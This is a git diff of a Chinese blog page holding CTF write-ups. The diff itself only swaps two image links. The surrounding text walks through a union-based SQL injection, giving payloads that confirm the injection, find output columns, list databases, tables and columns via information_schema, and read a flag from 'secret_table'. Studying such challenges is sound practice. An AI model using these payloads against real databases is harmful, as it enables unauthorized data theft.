@@ -17,12 +17,12 @@
 <p>首先拿到题目,首先试下sql注入.居然是sql注入的题目..</p>
 <h3 id="确定注入"><a href="#确定注入" class="headerlink" title="确定注入"></a>确定注入</h3><p><code>hello&#39; or &#39;1&#39;=&#39;1&#39;#</code></p>
 <h3 id="确定回显位"><a href="#确定回显位" class="headerlink" title="确定回显位"></a>确定回显位</h3><p><code>hello&#39; union select 1,2,3 #</code></p>
-<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/012xtop.jpg" alt="查询字段"></p>
+<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/012x01.jpg" alt="查询字段"></p>
 <h3 id="获取全部数据库名"><a href="#获取全部数据库名" class="headerlink" title="获取全部数据库名"></a>获取全部数据库名</h3><p><code>hello&#39; union select 1,2,schema_name from information_schema.schemata #</code></p>
 <h3 id="获取全部表名"><a href="#获取全部表名" class="headerlink" title="获取全部表名"></a>获取全部表名</h3><p><code>hello&#39; union select 1,2,table_name from information_schema.tables #</code></p>
 <h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><p><code>hello&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;secret_table&#39; #</code></p>
 <h3 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h3><p><code>hello&#39; union select 1,2,fl4g from secret_table #</code></p>
-<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/012xtop.jpg" alt="查询字段"></p>
+<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/012x02.jpg" alt="查询字段"></p>
 </div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/12/攻防世界的一些ctf/">攻防世界的一些ctf</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-12</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/技术/">技术</a></span><div class="content"><h1 id="题目描述：抓住那只猫"><a href="#题目描述：抓住那只猫" class="headerlink" title="题目描述：抓住那只猫"></a>题目描述：抓住那只猫</h1><p>一个网站测试的网页</p>
 <p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/011x01.jpg" alt="攻防世界的一些ctf_0x01"></p>
 <p>随便试了一个<code>index.php?url=%89</code>之后提示了Django的报错,推测是使用后端的php调用了Django网站的接口</p>
